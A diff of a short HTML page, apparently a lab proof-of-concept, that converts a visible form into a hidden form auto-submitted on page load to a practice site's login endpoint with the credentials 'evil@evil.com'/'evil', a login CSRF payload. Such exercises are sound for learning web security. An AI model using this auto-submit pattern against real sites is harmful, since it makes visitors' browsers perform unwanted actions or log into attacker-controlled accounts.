@@ -6,15 +6,18 @@
 </head>
 <body>
 
-<form method="post" action="https://csrf1.vulns101.ar7z1.com/login">
+<form id="formid" method="post" action="https://csrf1.vulns101.ar7z1.com/">
     <input type="hidden" id="email" name="email" value="evil@evil.com">
-    <input type="password" id="password" name="password" value="evil">
-    <input type="submit">
+    <input type="hidden" id="password" name="password" value="evil">
 </form>
-
 <script>
-
+window.onload = function (){
+    document.querySelector("#formid").submit();
+    
+}
+console.log('done');
 </script>
+
 
 </body>
 </html>
